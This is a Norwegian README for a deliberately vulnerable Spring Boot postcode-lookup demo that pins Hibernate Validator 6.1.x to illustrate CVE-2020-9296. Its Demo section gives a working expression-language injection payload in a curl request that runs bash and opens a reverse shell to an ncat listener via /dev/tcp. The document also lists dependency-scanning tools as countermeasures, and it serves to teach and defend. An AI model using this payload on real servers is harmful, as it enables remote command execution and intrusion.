# postnr-sb
Enkelt innbrudd i Java Spring Boot server vha. Hibernate Validator 6.1.x

## Byging og kjøring

Applikasjonen bygges og kjøres med maven:

```shell
mvn spring-boot:run
```

## API

### GET /postnr

Søk i databasen over postnummer med en GET mot /postnr. Søket tar inntil fire parametre.

| Parameter | Betydning | Type | 
--- | --- | --- |
| pn | Postnummer | Numerisk |
| ps | Poststed | | Streng |
| kn | Kommunenr | Numerisk |
| k | Kommunenavn | Streng |

Ex:
```shell
curl -s localhost:8080/postnr?pn=5230
```

Resultatet er en liste av poststeder som matcher søkekriteriene:

```json
[
  {
    "kommune": "Bergen",
    "kommunenr": "4601",
    "postnr": "5230",
    "poststed": "Paradis"
  }
]
```

### POST /postnr

Søk i databasen over postnummer med en POST mot /postnr. Søket tar inn et JSON-objekt på samme format som resultatet. Ingen av feltene er påkrevd. De feltene som er med, påvirker søket.

Hvis `kommunenr` eller `postnr` er angitt, må disse være numeriske.

Ex:
```shell
jq --null-input "{postnr:5230}" > pnOk.json
curl -s -X POST -H "Content-Type:application/json" -d @pnOk.json http://localhost:8080/postnr | jq
```

Resultatet er en liste av poststeder identisk med GET-søket over:

```json
[
  {
    "kommune": "Bergen",
    "kommunenr": "4601",
    "postnr": "5230",
    "poststed": "Paradis"
  }
]
```

### Feilhåndtering

Ved ugyldig innputt, vil begge endepunktene returnere en liste av feilmeldingsobjekter.

For eksempel, vil
```shell
curl -s localhost:8080/postnr?pn=Bergen | jq
```

returnere beskjed om at `pn` krever numerisk innputt:
```json
[
  {
    "property": "search.q.postnr",
    "message": "Fikk 'Bergen' der numerisk verdi var forventet."
  }
]
```

## Demo ##

Tre terminaler:
1. `ncat -lkvp 31338`
2. `mvn spring-boot:run`
3. `curl -vv -G --data-urlencode 'pn=${"".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null).exec(["bash", "-c", "exec 5<>/dev/tcp/127.0.0.1/31338;cat <&5 | while read line; do $line 2>&5 >&5;done"].toArray("".split(","))).waitFor()}' http://localhost:8080/postnr`

I terminal 1 kan man nå skrive vanlige bash-kommandoer og eksekvere dem på maskinen som kjører i terminal 2.

Punkt 3 kan også utføres med POST:
```shell
curl -s -X POST -H "Content-Type:application/json" -d @pnError.json http://localhost:8080/postnr | jq
```

## Kommentarer

Feilen er med i Hibernate Validator opp tom. 6.1.x-versjonene.
6.2.x og 7.0.x legger begrensning på EL-tolkningen og defaulter til å ikke kunne kalle metoder. Se detaljer: https://in.relation.to/2021/01/06/hibernate-validator-700-62-final-released/,

CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9296

Netflix: https://securitylab.github.com/advisories/GHSL-2020-027-netflix-conductor/

## Strategier

For å oppdage slike ting, bør en av de følgende vurderes. Den første er gratis, resten er abonnementsbasert. Snyk har noe gratis.

* OWASP Maven Plugin (https://owasp.org/www-project-dependency-check/  )​
* Snyk (https://snyk.io/ )​
* Nexus IQ (https://help.sonatype.com/iqserver )​
* Whitesource (https://www.whitesourcesoftware.com/ )​
* Black Duck (https://www.synopsys.com/software-integrity/security-testing/software-composition-analysis.html )​


### Tidlig oppdagelse

http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/

## Generert kode:

Koden er generert med https://start.spring.io/. Jeg har valgt Java 17 og lagt til 'Validation' og 'Spring Web'. I den genererte pom.xml, er så versjonen av spring-boot-starter-parent nedgradert til 2.4.13, siden 2.5.0 bruker Hibernate Validator 6.2.x. Merk at 2.4.13 er fra novemer 2021.

## Dokumentasjon

Java EE Expression Language: https://javaee.github.io/tutorial/jsf-el.html#GJDDD

Hibernate Validator: https://docs.jboss.org/hibernate/validator/6.1/reference/en-US/html_single/